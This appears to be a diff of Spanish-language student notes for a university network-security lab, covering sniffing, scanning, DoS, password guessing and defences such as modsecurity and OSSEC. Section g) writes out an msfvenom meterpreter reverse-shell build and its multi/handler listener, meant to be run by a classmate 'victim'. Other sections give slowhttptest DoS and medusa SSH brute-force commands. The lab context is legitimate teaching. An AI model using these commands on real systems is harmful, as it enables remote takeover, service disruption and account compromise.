@@ -28,6 +28,8 @@ rsyslog por puerto 514
 
 **ICMP Redirect** -> Mensajes empleados principalmente por routers para indicar rutas más óptimas por las que pasar paquetes. Puede ser explotado para que una máquina víctima asigne a la máquina del atacante como default gateway.
 
+**WAF** -> Web Application Firewall
+
 ## Práctica
 
 ##### a) Instale el ettercap y pruebe sus opciones básicas en línea de comando.
@@ -180,7 +182,61 @@ Y lo analizamos con la herramienta Wireshark.
 
 ##### g) Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute. 
 
+Descargamos e instalamos el instalador:
+
+```shell
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+```
+
+```shell
+chmod +x msfinstall #damos permisos de ejecución al script
+```
+
+```shell
+./msfinstall
+```
+
+Comprobamos la versión de metasploit:
+
+```shell
+msfconsole --version
+```
+
+Una vez tengamos instalado metasploit creamos el payload:
+
+```shell
+msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.49.47 lport=4444 -f elf -o rshell.elf
+```
+
+Le asignamos permisos de ejecución:
+
+```shell
+chmod +x rshell.elf
+```
+
+y lo comprimimos:
+
+```shell
+zip compressed.zip rshell.elf
+```
+
+Hacemos que el compañero lo ejecute en su máquina mientras ejecutamos lo siguiente:
+
+```shell
+msfconsole
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
+msf6 exploit(multi/handler) > set lhost 10.11.49.47
+msf6 exploit(multi/handler) > set lport 4444
+msf6 exploit(multi/handler) > exploit
+#esperamos a que la víctima ejecute
+```
+
+Mientras el compañero tenga el programa en ejecución tendremos total control de la máquina.
+
 ##### h) Haga un MITM en IPv6 y visualice la paquetería. 
+
+
 
 ##### i) Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon). 
 
@@ -204,7 +260,7 @@ y para detenerlo:
 systemctl stop arpon@ens33
 ```
 
-##### j) Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?. 
+##### j) Pruebe distintas técnicas de host discovery, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4? 
 
 Para escaneo de puertos usaremos nmap:
 
@@ -274,7 +330,9 @@ De esta forma obtienes las tasas de emisión y recepción en bytes/s y paquetes/
 3. Importe vía grafana el dashboard 1860. 
 4. En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas. 
 
-##### m) PARA PLANTEAR DE FORMA TEÓRICA.: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack?. 
+
+
+##### m) PARA PLANTEAR DE FORMA TEÓRICA.: ¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas? ¿Y mediante un DoS de tipo reflective flooding attack? 
 
 Un ataque DoS directo consiste en realizar un gran número de conexiones a la máquina víctima (servidor o máquina normal) con la intención de sobrepasar la capacidad de la misma para atenderlas.
 
@@ -291,7 +349,7 @@ apt install slowhttptest
 Y ejecutamos un comando con una estructura similar al siguiente:
 
 ```shell
-slowhttptest -c 1000 -g -X -o slow-file -r 200 -w 512 -y 1024 -n 5 -z 32 -K 3 -u http://IPcompañero -p 3
+slowhttptest -c 1000 -g -X -o slow-file -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://IPcompañero -p 3
 ```
 
 Expliquemos las opciones del comando:
@@ -314,6 +372,8 @@ Expliquemos las opciones del comando:
 **-n 5** -> intervalo en segundos de lectura de los datos almacenados en el buffer
 
 **-z 32** -> tiempo en segundos para que se cierren las conexiones en caso de inactividad
+
+**-k 3** -> número de veces que se repite la petición por conexión
 
 **-u http:// IPcompañero** -> Dirección del servidor víctima
 
@@ -350,15 +410,65 @@ para un ataque reflective
 **-dR** -> Reflects (mandan las respuestas al origen)
 ##### o) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora? 
 
+Vamos a instalar modsecurity con:
+
+```shell
+apt install libapache2-mod-security2
+```
+
+modificamos el archivo /etc/apache2/apache2.conf:
+
+```bash
+ServerName    nombredemiserver.es #puede ponerse lsi.es
+```
+
+el compañero debe incluir en el archivo /etc/hosts:
+
+```bash
+IPcompa   nombredemiserver.es #no incluir nombre de server de la propia máquina
+```
+
+para evitar el error "No Qualified Server Name", y modificamos el archivo /etc/modsecurity/modsecurity.conf-recomended, de forma que los datos sean los siguientes:
+
+```bash
+SetRuleEngine On
+
+SecCommEngine On
+SecCommWriteStateLimit 40 #número de cónexiones simultáneas de escritura
+SecCommReadStateLimit 40 #número de cónexiones simultáneas de lectura
+```
+
+finalmente reiniciamos el servicio:
+
+```shell
+systemctl restart apache2
+```
+
+Activamos el modsecurity con:
+
+```shell
+a2enmod security2
+```
+
+y lo desactivamos con:
+
+```shell
+a2dismod security2
+```
+
+<strong><u>Modsecurity no protege contra ataques read (usando GET)</u></strong>
+
 ##### p) Buscamos información: 
 1. Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña. 
 2. Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña. 
-3. ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?. En caso negativo, obtenga todos los nombres.dominio posibles de la UDC. 
+3. ¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC? En caso negativo, obtenga todos los nombres.dominio posibles de la UDC. 
 4. ¿Qué gestor de contenidos se utiliza en www.usc.es? 
 
 
 
 ##### q) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc. 
+
+
 
 ##### r) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas. 
 
@@ -367,6 +477,8 @@ Vamos a usar medusa para realizar password guessing:
 ```shell
 apt install medusa
 ```
+
+Creamos un fichero dic.txt con las posibles contraseñas.
 
 El comando que vamos a usar tiene el siguiente formato:
 
@@ -384,13 +496,74 @@ medusa -h IPcompi -u lsi -P dic.txt -M ssh -f
 
 **-f** -> indica que termine el ataque al encontrar una combinación correcta
 
+Comprueba que el log de inicio de sesión:
+
+```shell
+tail -n 50 /var/log/auth.log
+```
+
+para ver las últimas 50 líneas del fichero
+
 ##### s) Reportar alarmas está muy bien, pero no estaría mejor un sistema activo, en lugar de uno pasivo. Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”. 
+
+Descargamos e instalamos el zip:
+
+```shell
+wget https://github.com/ossec/ossec-hids/archive/refs/heads/master.zip
+```
+
+```shell
+unzip master.zip
+```
+
+```shell
+./install.sh
+```
+
+Tras ejecutar el archivo se abre un menú de instalación en el que seleccionaremos las siguientes opciones:
+
+>Se instala en modo local
+>El directorio se mantiene el por defecto
+>Se mandan correos de aviso por e-mail (a lsi@localhost)
+>Se habilita el servidor de integridad
+>Se activa la detección de rootkits
+>Se activa la respuesta activa
+>Desechar en el firewall
+>No se añaden direcciones a la lista blanca
+
+Al seleccionar las opciones pueden salir errores, lo que indica que faltan paquetes. Se instalan y se repite la instalación (si no estás seguro de qué falta, copia el error y pregunta a chatgpt).
+
+Para iniciar ossec:
+
+```shell
+/var/ossec/bin/ossec-control start
+```
+
+y para detenerlo:
+
+```shell
+/var/ossec/bin/ossec-control stop
+```
+
+Comprueba las reglas del firewall con:
+
+```shell
+iptables -L
+```
+
+Y miramos las respuestas del Ossec con:
+
+```shell
+tail /var/ossec/logs/active-responses.log
+```
 
 ##### t) Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.
 
 
 ##### Por hacer
 
-**Metasploit, modsecurity, ossec, grafana**
+**grafana, prometheus, node_exporter**
 
 **perfilar con nmap firewall, ip del compañero y servidor DHCP**
+
+**filtro etter para metasploit**
